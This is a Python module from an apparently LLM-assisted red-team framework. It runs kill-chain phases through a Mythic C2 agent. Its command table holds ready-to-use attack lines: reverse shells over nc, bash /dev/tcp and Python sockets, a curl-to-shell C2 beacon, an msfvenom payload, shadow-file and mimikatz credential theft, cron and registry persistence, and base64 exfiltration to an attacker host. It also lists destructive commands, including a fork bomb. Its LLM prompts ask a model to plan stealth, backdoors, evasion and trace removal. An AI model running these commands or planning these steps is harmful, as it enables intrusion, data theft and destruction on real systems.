"""
module for processing commands in the context of a chain,
based on doc https://www.unifiedkillchain.com/assets/The-Unified-Kill-Chain.pdf
"""
from app.cmd.c2_tool import execute_local_command, check_status
from app.models import AttackStep
from app.cmd.llm_analysis import *

UNSAFE_CMD = ["rm -fr /", "dd if=/dev/zero of=", "chown -R root:root /",
              "rm -rf /", ":(){ :|:& };:", "rm -rf *"]

phases = ("Reconnaissance", "Resource Development",
          "Delivery", "Social Engineering",
          "Exploitation", "Persistence", "Defense Evasion",
          "Command & Control", "Pivoting", "Discovery",
          "Privilege Escalation", "Execution", "Credential Access",
          "Lateral Movement", "Collection", "Exfiltration",
          "Impact", "Objectives")

PHASE_COMMANDS = {
    "Reconnaissance": [
        "nmap -sn <target>",
        "whois <domain>",
        "nslookup <domain>",
        "dig <domain>",
    ],
    "Resource Development": [
        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o payload.exe",
        "python3 -m http.server 8000",
    ],
    "Delivery": [
        "curl -T payload.exe ftp://<ip>/uploads/",
        "smbclient //target/share -U user%pass -c 'put payload.exe'",
    ],
    "Social Engineering": [
        "swaks --to user@example.com --from admin@example.com --server smtp.example.com --body 'Click here: http://evil.com'",
    ],
    "Exploitation": [
        "msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; run'",
        "sqlmap -u 'http://target/vuln.php?id=1' --batch --dump",
    ],
    "Persistence": [
        "crontab -l && echo '*/5 * * * * /tmp/payload' | crontab -",
        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d \"C:\\Users\\Public\\payload.exe\"",
    ],
    "Defense Evasion": [
        "upx payload.exe",
        "chattr +i /tmp/hidden_file",
    ],
    "Command & Control": [
        "nc -e /bin/sh <ip> <port>",
        "curl -s http://c2.server/beacon | sh",
    ],
    "Pivoting": [
        "ssh -D 9090 user@pivot-host",
        "proxychains nmap -sT -Pn 192.168.1.0/24",
    ],
    "Discovery": [
        "ps aux",
        "netstat -tulnp",
        "cat /etc/passwd",
        "arp -a",
    ],
    "Privilege Escalation": [
        "sudo -l",
        "find / -perm -4000 2>/dev/null",
        "cat /etc/shadow",
    ],
    "Execution": [
        "bash -i >& /dev/tcp/<ip>/<port> 0>&1",
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<ip>\",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
    ],
    "Credential Access": [
        "mimikatz.exe",
        "hashcat -m 1000 hashes.txt wordlist.txt",
    ],
    "Lateral Movement": [
        "psexec.py user@target 'cmd.exe'",
        "evil-winrm -i <ip> -u user -p pass",
    ],
    "Collection": [
        "tar czf /tmp/data.tar.gz /home/user/Documents/",
        "find / -name \"*.docx\" -type f 2>/dev/null",
    ],
    "Exfiltration": [
        "scp /tmp/data.tar.gz user@remote:/tmp/",
        "base64 /tmp/data.tar.gz | curl -X POST -d @- http://attacker.exfil.net",
    ],
    "Impact": [
        "rm -rf /important/data",
        "shutdown -h now",
    ],
    "Objectives": [
        "cat /flag.txt",
        "echo 'Mission Complete' > /root/success.log",
    ],
}


async def init_zero_agent():
    """ generate payload ->
        download by mythic_payload_uuid ->
        run via subprocess.run, save mythic agent info to db
        save Resource Development info to AttackStep"""
    pass


async def get_agent_status(callback_display_id):
    """ maybe process status, like if fail -> restart agent in chain """
    status = await check_status(callback_display_id)
    return status


async def check_and_process_local_cmd(
        cmd: str, c_display_id: int, chain_id: int, phase_name: str
) -> AttackStep:
    """ async function for check is safe command ->
        execute on zero agent, formatting to AttackStep """
    assert cmd not in UNSAFE_CMD
    # phase even for local command depends on current or recon
    assert is_command_allowed_in_phase(
        cmd, phase_name
    ), f"Command not allowed in phase {phase_name}"
    # send command to C2
    output, myth_t_id, myth_p_id, myth_p_uuid = await execute_local_command(
        cmd, c_display_id
    )

    # Отправляем вывод команды в LLM для анализа
    llm_analysis = await analyze_command_output_with_llm(output, cmd)

    attack_step = AttackStep(
        chain_id=chain_id,
        phase=phase_name,
        tool_name=cmd.split()[0],
        command=cmd,
        mythic_task_id=myth_t_id,
        mythic_payload_uuid=myth_p_uuid,
        mythic_payload_id=myth_p_id,
        raw_log=output,
        llm_analysis=llm_analysis,
        status="success"
    )
    return attack_step


async def analyze_command_output_with_llm(output: str, command: str) -> str:
    """
    sending command output to LLM for analysis
    """
    try:
        prompt = f"""
        command: {command}
        output: {output}

        analyze results and find most important things.
        """


        llm_response = await llm_service.query_llm(prompt)

        return llm_response

    except Exception as e:
        return f"error while analysis LLM: {str(e)}"


def is_command_allowed_in_phase(cmd: str, phase_name: str) -> bool:
    """ check command for allowed, we dont want to ransomware """
    allowed_commands = get_commands_for_phase(phase_name)
    # Можно сделать частичное совпадение или регулярки
    return any(
        cmd.strip().startswith(
            allowed.split()[0]
        ) for allowed in allowed_commands
    )


def get_commands_for_phase(phase_name: str):
    """ get specific command for phase, format """
    return PHASE_COMMANDS.get(phase_name, [])


async def suggest_actions_for_phase(phase_name: str) -> list[str]:
    """Return list of suggested commands for given phase"""
    return get_commands_for_phase(phase_name)


async def generate_action_suggestions_with_llm(phase_name: str, context_summary: str = ""):
    """Use LLM to refine suggestions based on summary or logs"""
    try:
        phase_prompts = {
            "recon": """
            You are a penetration testing expert. Currently in the reconnaissance phase.
            Based on the provided context, suggest the following actions:

            Context:
            {context}

            Please provide:
            1. Priority reconnaissance targets
            2. Recommended tools and commands
            3. Potential attack vectors
            4. What to look for in results
            5. Next steps

            Respond in JSON format with fields: priorities, tools, attack_vectors, what_to_look_for, next_steps
            """,

            "initial_access": """
            You are a penetration testing expert. Currently in the initial access phase.
            Based on the provided context, suggest methods for gaining access:

            Context:
            {context}

            Please provide:
            1. Potential access methods
            2. Recommended social engineering techniques
            3. Vulnerabilities to exploit
            4. Tools to use
            5. Next steps

            Respond in JSON format with fields: access_methods, social_engineering, vulnerabilities, tools, next_steps
            """,

            "execution": """
            You are a penetration testing expert. Currently in the execution phase.
            Based on the provided context, suggest code execution methods:

            Context:
            {context}

            Please provide:
            1. Code execution methods
            2. Defense evasion techniques
            3. Stealth execution techniques
            4. Tools to use
            5. Next steps

            Respond in JSON format with fields: execution_methods, bypass_techniques, stealth_methods, tools, next_steps
            """,

            "persistence": """
            You are a penetration testing expert. Currently in the persistence phase.
            Based on the provided context, suggest access persistence methods:

            Context:
            {context}

            Please provide:
            1. Persistence methods
            2. Stealth techniques
            3. Resilient backdoors
            4. Tools to use
            5. Next steps

            Respond in JSON format with fields: persistence_methods, stealth_techniques, backdoors, tools, next_steps
            """,

            "privilege_escalation": """
            You are a penetration testing expert. Currently in the privilege escalation phase.
            Based on the provided context, suggest privilege escalation methods:

            Context:
            {context}

            Please provide:
            1. Escalation methods
            2. Kernel vulnerabilities
            3. Configuration misconfigurations
            4. Tools to use
            5. Next steps

            Respond in JSON format with fields: escalation_methods, kernel_vulnerabilities, misconfigurations, tools, next_steps
            """,

            "discovery": """
            You are a penetration testing expert. Currently in the discovery phase.
            Based on the provided context, suggest information gathering methods:

            Context:
            {context}

            Please provide:
            1. System information gathering methods
            2. Network resource discovery
            3. Account and group discovery
            4. Tools to use
            5. Next steps

            Respond in JSON format with fields: system_info_methods, network_discovery, account_discovery, tools, next_steps
            """,

            "lateral_movement": """
            You are a penetration testing expert. Currently in the lateral movement phase.
            Based on the provided context, suggest network movement methods:

            Context:
            {context}

            Please provide:
            1. Movement methods
            2. Network traversal techniques
            3. Credential usage techniques
            4. Tools to use
            5. Next steps

            Respond in JSON format with fields: movement_methods, network_techniques, credential_usage, tools, next_steps
            """,

            "collection": """
            You are a penetration testing expert. Currently in the collection phase.
            Based on the provided context, suggest data collection methods:

            Context:
            {context}

            Please provide:
            1. Data collection methods
            2. Target data types
            3. Exfiltration techniques
            4. Tools to use
            5. Next steps

            Respond in JSON format with fields: collection_methods, target_data_types, exfiltration_techniques, tools, next_steps
            """,

            "command_and_control": """
            You are a penetration testing expert. Currently in the command and control phase.
            Based on the provided context, suggest C2 methods:

            Context:
            {context}

            Please provide:
            1. C2 communication methods
            2. Traffic obfuscation techniques
            3. Protocols to use
            4. Tools to use
            5. Next steps

            Respond in JSON format with fields: c2_methods, traffic_obfuscation, protocols, tools, next_steps
            """,

            "exfiltration": """
            You are a penetration testing expert. Currently in the exfiltration phase.
            Based on the provided context, suggest data exfiltration methods:

            Context:
            {context}

            Please provide:
            1. Data exfiltration methods
            2. Defense bypass techniques
            3. Data transfer channels
            4. Tools to use
            5. Next steps

            Respond in JSON format with fields: exfiltration_methods, bypass_techniques, data_channels, tools, next_steps
            """,

            "impact": """
            You are a penetration testing expert. Currently in the impact phase.
            Based on the provided context, suggest impact methods:

            Context:
            {context}

            Please provide:
            1. System impact methods
            2. Availability attack techniques
            3. Trace removal methods
            4. Tools to use
            5. Next steps

            Respond in JSON format with fields: impact_methods, availability_attacks, trace_removal, tools, next_steps
            """
        }

        base_prompt = phase_prompts.get(phase_name, phase_prompts["recon"])
        prompt = base_prompt.format(context=context_summary if context_summary else "No context provided")
        llm_response = await llm_service.query_llm(prompt)

        try:
            import json
            suggestions = json.loads(llm_response)
            return suggestions
        except json.JSONDecodeError:
            return {
                "phase": phase_name,
                "suggestions": llm_response,
                "format": "text"
            }

    except Exception as e:
        return {
            "phase": phase_name,
            "error": f"Error generating suggestions: {str(e)}",
            "suggestions": []
        }
